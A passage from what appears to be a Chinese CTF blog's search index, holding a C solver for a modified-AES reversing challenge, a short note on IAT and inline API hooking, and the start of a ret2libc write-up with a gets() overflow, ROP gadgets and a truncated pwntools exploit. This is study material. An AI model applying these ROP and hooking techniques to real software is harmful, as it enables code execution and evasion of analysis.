tempa;</span></span><br><span class="line"></span><br><span class="line">tempa = state[<span class="number">9</span>];</span><br><span class="line">state[<span class="number">9</span>] = state[<span class="number">1</span>];</span><br><span class="line">state[<span class="number">1</span>] = tempa;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//tempb = state[5];</span></span><br><span class="line"><span class="comment">//state[5] = state[13];</span></span><br><span class="line"><span class="comment">//state[13] = tempb;</span></span><br><span class="line"></span><br><span class="line">tempb = state[<span class="number">13</span>];</span><br><span class="line">state[<span class="number">13</span>] = state[<span class="number">5</span>];</span><br><span class="line">state[<span class="number">5</span>] = tempb;</span><br><span class="line"></span><br><span class="line"><span class="comment">//tempc = state[2];</span></span><br><span class="line"><span class="comment">//state[2] = state[6];</span></span><br><span class="line"><span class="comment">//state[6] = state[10];</span></span><br><span class="line"><span class="comment">//state[10] = state[14];</span></span><br><span class="line"><span class="comment">//state[14] = tempc;</span></span><br><span class="line"></span><br><span class="line">tempc = state[<span class="number">14</span>];</span><br><span class="line">state[<span class="number">14</span>] = state[<span class="number">10</span>];</span><br><span class="line">state[<span class="number">10</span>] = state[<span class="number">6</span>];</span><br><span class="line">state[<span class="number">6</span>] = state[<span class="number">2</span>];</span><br><span class="line">state[<span class="number">2</span>] = tempc;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint8_t</span> __cdecl <span class="title">mul2</span><span class="params">(<span class="type">uint8_t</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> ((a &amp; <span class="number">0x80</span>u) == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span> * a;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">return</span> (<span class="number">2</span> * a) ^ <span class="number">0x1B</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">aes_encrypt_128</span><span class="params">(BYTE* roundkeys, BYTE* m, BYTE* c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">uint8_t</span>* mid; <span class="comment">// rax</span></span><br><span class="line"><span class="type">const</span> <span class="type">uint8_t</span>* v4; <span class="comment">// rax</span></span><br><span class="line"><span class="type">const</span> <span class="type">uint8_t</span>* v5; <span class="comment">// rax</span></span><br><span class="line"><span class="type">uint8_t</span> tmp[<span class="number">16</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line"><span class="type">uint8_t</span> t; <span class="comment">// [rsp+3Dh] [rbp-3h]</span></span><br><span class="line"><span class="type">uint8_t</span> j; <span class="comment">// [rsp+3Eh] [rbp-2h]</span></span><br><span class="line"><span class="type">uint8_t</span> i; <span class="comment">// [rsp+3Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; ++i)</span><br><span class="line">&#123;</span><br><span class="line">mid = roundkeys++;</span><br><span class="line">c[i] = *mid ^ m[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= <span class="number">9u</span>; ++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; ++i)</span><br><span class="line">tmp[i] = INV_SBOX[c[i]];</span><br><span class="line"><span class="built_in">shift_rows</span>(tmp);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; i += <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">t = tmp[i + <span class="number">2</span>] ^ tmp[i + <span class="number">1</span>] ^ tmp[i] ^ tmp[i + <span class="number">3</span>];</span><br><span class="line">c[i] = t ^ tmp[i] ^ <span class="built_in">mul2</span>(tmp[i] ^ tmp[i + <span class="number">1</span>]);</span><br><span class="line">c[i + <span class="number">1</span>] = t ^ tmp[i + <span class="number">1</span>] ^ <span class="built_in">mul2</span>(tmp[i + <span class="number">1</span>] ^ tmp[i + <span class="number">2</span>]);</span><br><span class="line">c[i + <span class="number">2</span>] = t ^ tmp[i + <span class="number">2</span>] ^ <span class="built_in">mul2</span>(tmp[i + <span class="number">2</span>] ^ tmp[i + <span class="number">3</span>]);</span><br><span class="line">c[i + <span class="number">3</span>] = t ^ tmp[i + <span class="number">3</span>] ^ <span class="built_in">mul2</span>(tmp[i + <span class="number">3</span>] ^ tmp[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; ++i)</span><br><span class="line">&#123;</span><br><span class="line">v4 = roundkeys++;</span><br><span class="line">c[i] ^= *v4;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; ++i)</span><br><span class="line">c[i] = INV_SBOX[c[i]];</span><br><span class="line"><span class="built_in">shift_rows</span>(c);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; ++i)</span><br><span class="line">&#123;</span><br><span class="line">v5 = roundkeys++;</span><br><span class="line">c[i] ^= *v5;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">cToTmp</span><span class="params">(<span class="type">uint8_t</span>* tmp, <span class="type">uint8_t</span>* c)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; i += <span class="number">4</span>) &#123;</span><br><span class="line"><span class="type">uint8_t</span> t = c[i + <span class="number">2</span>] ^ c[i + <span class="number">1</span>] ^ c[i] ^ c[i + <span class="number">3</span>];</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint16_t</span> t0 = <span class="number">0</span>; t0 &lt;= <span class="number">256</span>; t0++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint16_t</span> t1 = <span class="number">0</span>; t1 &lt;= <span class="number">256</span>; t1++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c[i] == (t ^ t0 ^ <span class="built_in">mul2</span>(t0 ^ t1)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint16_t</span> t2 = <span class="number">0</span>; t2 &lt;= <span class="number">256</span>; t2++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c[i + <span class="number">1</span>] == (t ^ t1 ^ <span class="built_in">mul2</span>(t2 ^ t1)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint16_t</span> t3 = <span class="number">0</span>; t3 &lt;= <span class="number">256</span>; t3++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c[i + <span class="number">2</span>] == (t ^ t2 ^ <span class="built_in">mul2</span>(t2 ^ t3)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c[i + <span class="number">3</span>] == (t ^ t3 ^ <span class="built_in">mul2</span>(t0 ^ t3)))</span><br><span class="line">&#123;</span><br><span class="line">tmp[i] = t0;</span><br><span class="line">tmp[i + <span class="number">1</span>] = t1;</span><br><span class="line">tmp[i + <span class="number">2</span>] = t2;</span><br><span class="line">tmp[i + <span class="number">3</span>] = t3;</span><br><span class="line"><span class="comment">//printf(&quot;%x %x %x %x\n&quot;, tmp[i], tmp[i + 1], tmp[i + 2], tmp[i + 3]);</span></span><br><span class="line"><span class="keyword">goto</span> next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">next:;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">aes_decrypt_128</span><span class="params">(BYTE* roundkeys, BYTE* c, BYTE* m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint8_t</span> tmp[<span class="number">16</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">BYTE* u = <span class="number">0</span>;</span><br><span class="line">roundkeys = &amp;roundkeys[<span class="number">175</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0xf</span>; i &gt;= <span class="number">0</span>; --i)</span><br><span class="line">&#123;</span><br><span class="line">u = roundkeys--;</span><br><span class="line">m[i] = *u ^ c[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">9</span>; j &gt;= <span class="number">1</span>; --j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">inv_shiftrows</span>(m);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>; ++i)</span><br><span class="line">m[i] = SBOX[m[i]];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0xf</span>; i &gt;= <span class="number">0</span>; --i)</span><br><span class="line">&#123;</span><br><span class="line">u = roundkeys--;</span><br><span class="line">m[i] ^= *u;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cToTmp</span>(tmp, m);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">m[i] = tmp[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">inv_shiftrows</span>(m);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>; ++i)</span><br><span class="line">m[i] = SBOX[m[i]];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0xf</span>; i &gt;= <span class="number">0</span>; --i)</span><br><span class="line">&#123;</span><br><span class="line">u = roundkeys--;</span><br><span class="line">m[i] ^= *u;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">encMain</span><span class="params">(BYTE* roundKey, BYTE* m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//auto part1 = reinterpret_cast&lt;BYTE*&gt;(const_cast&lt;char*&gt;(m.substr(0, m.length() / 2).c_str()));</span></span><br><span class="line"><span class="comment">//auto part2 = reinterpret_cast&lt;BYTE*&gt;(const_cast&lt;char*&gt;(m.substr(m.length() / 2).c_str()));</span></span><br><span class="line"><span class="comment">/*BYTE* part1 = const_cast&lt;BYTE*&gt;(m.data());*/</span></span><br><span class="line"></span><br><span class="line">BYTE c[<span class="number">33</span>] = &#123;&#125;;</span><br><span class="line"><span class="built_in">aes_encrypt_128</span>(roundKey, m, c);</span><br><span class="line"><span class="built_in">aes_encrypt_128</span>(roundKey, m + <span class="number">16</span>, &amp;c[<span class="number">16</span>]);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%x,&quot;</span>, c[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decMain</span><span class="params">(BYTE* roundKey, BYTE* c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BYTE m[<span class="number">33</span>] = &#123;&#125;;</span><br><span class="line"><span class="built_in">aes_decrypt_128</span>(roundKey, c, m);</span><br><span class="line"><span class="built_in">aes_decrypt_128</span>(roundKey, &amp;c[<span class="number">16</span>], m + <span class="number">16</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%x,&quot;</span>, m[i]);</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; endl;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, m);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BYTE m[] = <span class="string">&quot;11111111111111111111111111111111\0&quot;</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> rkey[<span class="number">179</span>] = &#123;</span><br><span class="line"><span class="number">0x57</span>, <span class="number">0x65</span>, <span class="number">0x6C</span>, <span class="number">0x63</span>, <span class="number">0x6F</span>, <span class="number">0x6D</span>, <span class="number">0x65</span>, <span class="number">0x5F</span>, <span class="number">0x74</span>, <span class="number">0x6F</span>, <span class="number">0x5F</span>, <span class="number">0x63</span>, <span class="number">0x74</span>, <span class="number">0x66</span>, <span class="number">0x21</span>, <span class="number">0x21</span>,</span><br><span class="line"><span class="number">0x65</span>, <span class="number">0x98</span>, <span class="number">0x91</span>, <span class="number">0xF1</span>, <span class="number">0x0A</span>, <span class="number">0xF5</span>, <span class="number">0xF4</span>, <span class="number">0xAE</span>, <span class="number">0x7E</span>, <span class="number">0x9A</span>, <span class="number">0xAB</span>, <span class="number">0xCD</span>, <span class="number">0x0A</span>, <span class="number">0xFC</span>, <span class="number">0x8A</span>, <span class="number">0xEC</span>,</span><br><span class="line"><span class="number">0xD7</span>, <span class="number">0xE6</span>, <span class="number">0x5F</span>, <span class="number">0x96</span>, <span class="number">0xDD</span>, <span class="number">0x13</span>, <span class="number">0xAB</span>, <span class="number">0x38</span>, <span class="number">0xA3</span>, <span class="number">0x89</span>, <span class="number">0x00</span>, <span class="number">0xF5</span>, <span class="number">0xA9</span>, <span class="number">0x75</span>, <span class="number">0x8A</span>, <span class="number">0x19</span>,</span><br><span class="line"><span class="number">0x4E</span>, <span class="number">0x98</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0x93</span>, <span class="number">0x8B</span>, <span class="number">0x20</span>, <span class="number">0x7D</span>, <span class="number">0x30</span>, <span class="number">0x02</span>, <span class="number">0x20</span>, <span class="number">0x88</span>, <span class="number">0x99</span>, <span class="number">0x77</span>, <span class="number">0xAA</span>, <span class="number">0x91</span>,</span><br><span class="line"><span class="number">0xB3</span>, <span class="number">0x34</span>, <span class="number">0x0A</span>, <span class="number">0xAB</span>, <span class="number">0x20</span>, <span class="number">0xBF</span>, <span class="number">0x2A</span>, <span class="number">0xD6</span>, <span class="number">0x10</span>, <span class="number">0xBD</span>, <span class="number">0x0A</span>, <span class="number">0x5E</span>, <span class="number">0x89</span>, <span class="number">0xCA</span>, <span class="number">0xA0</span>, <span class="number">0xCF</span>,</span><br><span class="line"><span class="number">0xD7</span>, <span class="number">0xD4</span>, <span class="number">0x80</span>, <span class="number">0x0C</span>, <span class="number">0xF7</span>, <span class="number">0x6B</span>, <span class="number">0xAA</span>, <span class="number">0xDA</span>, <span class="number">0xE7</span>, <span class="number">0xD6</span>, <span class="number">0xA0</span>, <span class="number">0x84</span>, <span class="number">0x6E</span>, <span class="number">0x1C</span>, <span class="number">0x00</span>, <span class="number">0x4B</span>,</span><br><span class="line"><span class="number">0x6B</span>, <span class="number">0xB7</span>, <span class="number">0x33</span>, <span class="number">0x93</span>, <span class="number">0x9C</span>, <span class="number">0xDC</span>, <span class="number">0x99</span>, <span class="number">0x49</span>, <span class="number">0x7B</span>, <span class="number">0x0A</span>, <span class="number">0x39</span>, <span class="number">0xCD</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x39</span>, <span class="number">0x86</span>,</span><br><span class="line"><span class="number">0x6C</span>, <span class="number">0xA5</span>, <span class="number">0x77</span>, <span class="number">0xCA</span>, <span class="number">0xF0</span>, <span class="number">0x79</span>, <span class="number">0xEE</span>, <span class="number">0x83</span>, <span class="number">0x8B</span>, <span class="number">0x73</span>, <span class="number">0xD7</span>, <span class="number">0x4E</span>, <span class="number">0x9E</span>, <span class="number">0x65</span>, <span class="number">0xEE</span>, <span class="number">0xC8</span>,</span><br><span class="line"><span class="number">0xA1</span>, <span class="number">0x8D</span>, <span class="number">0x9F</span>, <span class="number">0xC1</span>, <span class="number">0x51</span>, <span class="number">0xF4</span>, <span class="number">0x71</span>, <span class="number">0x42</span>, <span class="number">0xDA</span>, <span class="number">0x87</span>, <span class="number">0xA6</span>, <span class="number">0x0C</span>, <span class="number">0x44</span>, <span class="number">0xE2</span>, <span class="number">0x48</span>, <span class="number">0xC4</span>,</span><br><span class="line"><span class="number">0x22</span>, <span class="number">0xDF</span>, <span class="number">0x83</span>, <span class="number">0xDA</span>, <span class="number">0x73</span>, <span class="number">0x2B</span>, <span class="number">0xF2</span>, <span class="number">0x98</span>, <span class="number">0xA9</span>, <span class="number">0xAC</span>, <span class="number">0x54</span>, <span class="number">0x94</span>, <span class="number">0xED</span>, <span class="number">0x4E</span>, <span class="number">0x1C</span>, <span class="number">0x50</span>,</span><br><span class="line"><span class="number">0x3B</span>, <span class="number">0x43</span>, <span class="number">0xD0</span>, <span class="number">0x8F</span>, <span class="number">0x48</span>, <span class="number">0x68</span>, <span class="number">0x22</span>, <span class="number">0x17</span>, <span class="number">0xE1</span>, <span class="number">0xC4</span>, <span class="number">0x76</span>, <span class="number">0x83</span>, <span class="number">0x0C</span>, <span class="number">0x8A</span>, <span class="number">0x6A</span>, <span class="number">0xD3</span>,</span><br><span class="line"><span class="number">0x40</span>, <span class="number">0x15</span>, <span class="number">0x40</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//encMain(rkey, m);</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> c[<span class="number">8</span>] = &#123;</span><br><span class="line"><span class="number">0x768E076C</span>, <span class="number">0x8A2F31A6</span>, <span class="number">0xE452B98D</span>, <span class="number">0xAA000D64</span>, <span class="number">0x48802D4B</span>, <span class="number">0xEC290C73</span>, <span class="number">0x17F0FFC3</span>, <span class="number">0x2785A657</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">decMain</span>(rkey, <span class="built_in">reinterpret_cast</span>&lt;BYTE*&gt;(c));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> é¢˜é›† </category>
          
          <category> CTF </category>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
            <tag> AES </tag>
            
            <tag> çˆ†ç ´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Šé€†æ ¸ã€‹0A-APIå‹¾å–</title>
      <link href="/posts/6dc52a20.html"/>
      <url>/posts/6dc52a20.html</url>
      
        <content type="html"><![CDATA[<h2 id="APIå‹¾å–">APIå‹¾å–</h2><p>å®é™…ä¸Šå°±æ˜¯å¯¹ç¨‹åºä½¿ç”¨çš„ç³»ç»ŸAPIè¿›è¡ŒHook</p><p><img src="https://s2.loli.net/2025/01/10/YvLw8UG9QMeoKry.png" alt="image-20250110233657957"></p><p>å¯ä»¥ä¿®æ”¹IAT/EAT/ä»£ç ï¼Œå¯¹äºç›´æ¥hookä»£ç ï¼Œå’Œä¹‹å‰çš„inlineHookä¸€æ ·<br>å¯¹äºIATï¼Œæ˜¯ç¨‹åºæ‰§è¡Œå¯¹åº”APIä»£ç æ—¶ï¼ŒIATä¼šå­˜æ”¾å¯¹åº”å‡½æ•°åç§»ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jmp cs:offset</span><br><span class="line">......</span><br><span class="line">offset çœŸå®åç§»</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç›´æ¥ä¿®æ”¹è¿™é‡Œçš„çœŸå®åç§»ï¼Œç„¶åè·³è½¬åˆ°è‡ªå·±çš„ä»£ç ä¸­ï¼Œæœ€åè·³è½¬åˆ°çœŸå®åç§»åœ°å€ã€‚</p><p>æœ¬è´¨ä¸Šè¿˜æ˜¯Hookï¼Œä½†æ˜¯è¦æ³¨æ„å‚æ•°çš„ä¼ é€’ï¼Œå…·ä½“å¯ä»¥çœ‹ä¹‹å‰çš„è°ƒç”¨çº¦å®šé‚£ä¸€ç¯‡æˆ–è€…å…·ä½“è°ƒè¯•åˆ†æã€‚</p><h2 id="å®è·µ">å®è·µ</h2><p>è¯¦è§ä¸‹é¢è¿™ä¸ªé¡¹ç›®ï¼š</p><p><a href="https://github.com/43287/AntiAntiDebug_plugin_for_IDA8.3">43287/AntiAntiDebug_plugin_for_IDA8.3: ä¸€ä¸ªåªæ”¯æŒx64çš„IDAåè°ƒè¯•æ’ä»¶</a></p><p>å…¶ä¸­ä½¿ç”¨äº†IAThookå’ŒInlineHook</p>]]></content>
      
      
      <categories>
          
          <category> é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç† </category>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> æŠ€èƒ½ </category>
          
          <category> Hook </category>
          
      </categories>
      
      
        <tags>
            
            <tag> win </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2libcä¸æ ˆè¿ç§»</title>
      <link href="/posts/26c65c86.html"/>
      <url>/posts/26c65c86.html</url>
      
        <content type="html"><![CDATA[<h3 id="RET2libc">RET2libc</h3><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸€ä¸ªç¨‹åºä¸ä¼šæœ‰system(â€œbin/shâ€)è¿™ç§å±é™©ä»£ç è®©æˆ‘ä»¬ç›´æ¥getshellã€‚</p><p>ret2libcæ˜¯ä¸€ç§æ–¹æ³•ï¼Œè®©æˆ‘ä»¬å–å¾—å¤–éƒ¨åŠ¨æ€é“¾æ¥åº“(so)çš„åŸºåœ°å€ï¼Œå¹¶é€šè¿‡åŸºåœ°å€åŠ åç§»çš„æ–¹å¼è·å¾—ç›®æ ‡åº“å‡½æ•°çš„åœ°å€ï¼Œä»è€Œåœ¨ç¨‹åºæ²¡æœ‰ä¸»åŠ¨è°ƒç”¨ç›®æ ‡å‡½æ•°æ—¶ä¿®æ”¹retåœ°å€è¿”å›åˆ°æˆ‘ä»¬æƒ³è¦çš„åº“å‡½æ•°åœ°å€ã€‚</p><p>ç»ƒä¹ é¢˜ï¼š</p><p>æ‰“å¼€å…ˆchecksec</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Arch:</span>     <span class="string">amd64-64-little</span></span><br><span class="line"><span class="attr">RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span></span><br><span class="line"><span class="attr">Stack:</span>    <span class="literal">No</span> <span class="string">canary</span> <span class="string">found</span></span><br><span class="line"><span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line"><span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x400000)</span></span><br></pre></td></tr></table></figure><p>æœ‰éƒ¨åˆ†RELROå’ŒNXä¿æŠ¤</p><p>vulnå‡½æ•°ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">112</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿›è¡Œäº†ä¸€æ¬¡è¾“å‡ºï¼Œä¸€æ¬¡è¾“å…¥ï¼Œè¾“å…¥é•¿åº¦ä¸º112ï¼Œå¾ˆæ˜æ˜¾å¯ä»¥è¦†ç›–åœ°å€</p><p>ç¨‹åºæ²¡æœ‰bin/shå­—ç¬¦ä¸²å’Œsystemåœ°å€ï¼Œæ‰€ä»¥åªèƒ½è‡ªå·±æ³„æ¼å‡ºæ¥</p><p>gotè¡¨ä¼šå…ˆæŒ‰æ‰§è¡Œé¡ºåºç”Ÿæˆåœ°å€ï¼Œæ‰€ä»¥å…ˆè¿›å…¥mainåä¸€å®šä¼šå…ˆç”Ÿæˆ__libc_start_mainå‡½æ•°ã€‚é€šè¿‡è¿™ä¸ªå¾—åˆ°libcåŸºåœ°å€ç„¶ååŠ å¯¹åº”åç§»å¾—åˆ°systemå’Œbin/shåœ°å€ï¼Œæœ€åæ„é€ ropé“¾å»æ‰§è¡Œå‡½æ•°</p><p>é¡ºåºï¼š</p><p>vulnâ€“&gt;putsâ€“&gt;system</p><p>ç°åœ¨è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬æ§åˆ¶çš„åœ°å€åªæ˜¯æ ˆï¼Œä½†æ˜¯putså‡½æ•°çš„ä¼ å‚å´åœ¨å¯„å­˜å™¨é‡Œé¢ï¼Œè¯¥å¦‚ä½•æŠŠæ ˆä¸­çš„å€¼æ”¾åˆ°å¯„å­˜å™¨é‡Œå‘¢ï¼Œå¾ˆæ˜æ˜¾ï¼ŒpopæŒ‡ä»¤</p><p>å¯ä»¥çœ‹åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004011E8     ; __unwind &#123;</span><br><span class="line">.text:00000000004011E8 000                 endbr64</span><br><span class="line">.text:00000000004011EC 000                 push    rbp</span><br><span class="line">.text:00000000004011ED 008                 mov     rbp, rsp</span><br><span class="line">.text:00000000004011F0 008                 sub     rsp, 70h</span><br><span class="line">.text:00000000004011F4 078                 lea     rax, s          ; &quot;RET2LIBC &gt;_&lt;&quot;</span><br><span class="line">.text:00000000004011FB 078                 mov     rdi, rax        ; s</span><br><span class="line">.text:00000000004011FE 078                 call    _puts</span><br><span class="line">.text:0000000000401203 078                 lea     rax, [rbp+var_70]</span><br><span class="line">.text:0000000000401207 078                 mov     rdi, rax</span><br><span class="line">.text:000000000040120A 078                 mov     eax, 0</span><br><span class="line">.text:000000000040120F 078                 call    _gets</span><br><span class="line">.text:0000000000401214 078                 nop</span><br><span class="line">.text:0000000000401215 078                 leave</span><br><span class="line">.text:0000000000401216 000                 retn</span><br><span class="line">.text:0000000000401216     ; &#125; // starts at 4011E8</span><br><span class="line">.text:0000000000401216     vuln            endp</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¼ ç»™putsçš„å€¼æ˜¯rdi</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ret2libc --only &#x27;pop|ret&#x27;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040115d : pop rbp ; ret</span><br><span class="line">0x00000000004011e3 : pop rdi ; ret</span><br><span class="line">0x000000000040101a : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 3</span><br></pre></td></tr></table></figure><p>ç”¨gadgetçœ‹çœ‹ï¼Œå‘ç°0x00000000004011e3 : pop rdi ; ret<br>å¦‚æœå…ˆè¿”å›è¿™ä¸ªåœ°å€ï¼Œå°±å¯ä»¥æŠŠå†™å…¥æ ˆçš„æ³„éœ²åœ°å€ç»™rdiï¼Œç„¶åæ‰§è¡Œåé¢çš„æ“ä½œ</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span 